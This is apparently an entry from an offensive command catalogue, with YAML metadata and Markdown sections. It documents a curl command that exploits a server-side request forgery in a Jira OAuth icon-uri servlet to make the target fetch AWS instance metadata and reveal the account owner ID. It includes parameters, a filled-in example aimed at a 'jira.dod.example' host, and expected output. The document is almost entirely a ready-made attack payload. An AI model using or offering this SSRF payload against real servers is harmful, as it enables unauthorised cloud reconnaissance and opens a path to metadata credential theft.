---
data: >-
  curl
  "https://target-domain/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/network/interfaces/macs/XX:XX:XX:XX:XX:XX/owner-id"
tags:
  - ssrf
  - aws
  - network
type: command
output: '993671966739'
executor: bash
platforms:
  - Linux
  - AWS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:55.287Z'
id: a40e045e-4963-4d7b-8d36-1a801a3a548f
verified: false
validated: true
submitted: true
---
# curl-ssrf-network-owner-id

## Command

```bash
curl "https://target-domain/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/network/interfaces/macs/XX:XX:XX:XX:XX:XX/owner-id"
```

## Description

Fetches the owner ID for a network interface (replace XX:XX with actual MAC).

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `target-domain` | Vulnerable app domain | Yes |
| `MAC` | Network interface MAC | Yes |

## Examples

### Basic Usage

```bash
curl "https://jira.dod.example/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/network/interfaces/macs/02:ab:cd:ef:01:02/owner-id"
```

## Expected Output

Account owner ID as plain text.

## Related

- [[Related Procedure: Retrieve-AWS-Instance-Metadata-via-SSRF]]
